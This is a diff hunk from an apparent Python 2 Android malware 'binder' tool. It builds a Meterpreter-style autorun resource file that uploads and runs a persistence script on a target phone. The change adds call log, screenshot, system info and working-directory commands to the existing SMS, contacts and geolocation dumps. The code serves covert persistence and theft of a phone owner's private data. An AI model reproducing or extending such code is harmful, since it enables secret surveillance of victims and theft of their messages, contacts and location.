@@ -270,7 +270,7 @@ def _binder():
         shell=True)
     print "I: Generating persistence..."
     subprocess.call(
-        'echo "upload ' + tmp + 'persis.sh" > ' + tmp + 'autoand.rc && echo "execute -f \"sh persis.sh\"" >> ' + tmp + 'autoand.rc && echo "dump_sms" >> ' + tmp + 'autoand.rc && echo "dump_contacts" >> ' + tmp + 'autoand.rc && echo "geolocate" >> ' + tmp + 'autoand.rc',
+        'echo "upload ' + tmp + 'persis.sh" > ' + tmp + 'autoand.rc;echo "execute -f \"sh persis.sh\"" >> ' + tmp + 'autoand.rc;echo "sysinfo" >> ' + tmp + 'autoand.rc;echo "getwd" >> ' + tmp + 'autoand.rc;echo "geolocate" >> ' + tmp + 'autoand.rc;echo "screenshot" >> ' + tmp + 'autoand.rc;echo "dump_calllog" >> ' + tmp + 'autoand.rc;echo "dump_sms" >> ' + tmp + 'autoand.rc;echo "dump_contacts" >> ' + tmp + 'autoand.rc',
         shell=True)
     print "I: Clear data templates..."
     subprocess.call(
